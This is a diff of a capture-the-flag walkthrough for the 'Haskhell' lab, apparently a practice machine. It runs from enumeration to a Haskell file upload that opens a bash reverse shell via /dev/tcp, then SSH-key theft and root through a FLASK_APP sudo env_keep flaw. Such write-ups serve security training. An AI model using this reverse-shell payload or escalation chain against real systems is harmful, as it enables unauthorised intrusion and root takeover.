@@ -1,39 +1,42 @@
 ---
 sticker: emoji//1f9d1-200d-1f4bb
 ---
+# ENUMERATION
+---
 
-# HASKHELL
 
-## ENUMERATION
 
-***
+## OPEN PORTS
+---
 
-### OPEN PORTS
-
-***
 
 | PORT | SERVICE |
-| ---- | ------- |
+| :--- | :------ |
 | 22   | SSH     |
 | 5001 | HTTP    |
 
-## RECONNAISSANCE
 
-***
+
+# RECONNAISSANCE
+---
+
 
 We can begin by visiting the web application:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250404151817.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250404151817.png)
+
 
 If we go to the homework section, we can see the following:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250404152029.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250404152029.png)
 
 We can go to the link and it will take us here:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250404152050.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250404152050.png)
 
 If we fuzz, we can find the submit directory in which we can upload a `haskell` file:
+
 
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.110.142:5001/FUZZ" -ic -c -t 200\
@@ -61,13 +64,15 @@ submit                  [Status: 200, Size: 237, Words: 48, Lines: 9, Duration: 
 
 ```
 
-A Haskell file (with the `.hs` extension) is a text file containing code written in the Haskell programming language, a purely functional, statically typed language. These files are used to define functions, data types, and program logic. When compiled or interpreted, the code is executed to perform tasks.
+
+A Haskell file (with the `.hs` extension) is a text file containing code written in the Haskell programming language, a purely functional, statically typed language. These files are used to define functions, data types, and program logic. When compiled or interpreted, the code is executed to perform tasks.
 
 Based on that, we can begin exploitation.
 
-## EXPLOITATION
 
-***
+# EXPLOITATION
+---
+
 
 Ok, if we read the homework section, we can find the indications on how to upload the Haskell file:
 
@@ -78,6 +83,7 @@ Ok, if we read the homework section, we can find the indications on how to uploa
 
 3) A function called "grey" that takes a number as input and returns all of the codes for that n-bit number. Ex: grey 3 outputs ['000','001','011','010',110,111,101,100]. You can find more information about grey codes here: https://en.wikipedia.org/wiki/Gray_code" 
 ```
+
 
 Nice, if we follow the instructions, we can create a payload to receive a reverse shell:
 
@@ -106,13 +112,16 @@ main = callCommand "bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'"
 
 If we upload the file, and set up our listener, we can see the following:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250404152827.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250404152827.png)
 
 There we go, we got our shell. Let's start privilege escalation.
 
-## PRIVILEGE ESCALATION
 
-***
+
+
+# PRIVILEGE ESCALATION
+---
+
 
 Let's begin by stabilizing the shell:
 
@@ -135,7 +144,8 @@ flag{academic_dishonesty}
 
 We can grab the `id_rsa` from `prof` and log into ssh:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250404153210.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250404153210.png)
+
 
 If we check our sudo privileges, we can notice this:
 
@@ -167,9 +177,10 @@ if __name__ == '__main__':
     )
 ```
 
-* The `FLASK_APP` environment variable is preserved due to `env_keep` in the sudoers configuration.
-* By pointing `FLASK_APP` to a malicious script, Flask executes it as root when `sudo flask run` is called.
-* This bypasses restrictions because the script runs in the context of the Flask process (owned by root).
+
+- The `FLASK_APP` environment variable is preserved due to `env_keep` in the sudoers configuration. 
+- By pointing `FLASK_APP` to a malicious script, Flask executes it as root when `sudo flask run` is called.
+- This bypasses restrictions because the script runs in the context of the Flask process (owned by root).
 
 So, we can do the following:
 
@@ -194,7 +205,7 @@ sudo /usr/bin/flask run
 
 We can see the following:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250404154306.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250404154306.png)
 
 There we go, we got our root shell and can finally read `root.txt`:
 
@@ -203,4 +214,5 @@ bash-4.4# cat /root/root.txt
 flag{im_purely_functional}
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250404154405.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250404154405.png)
+
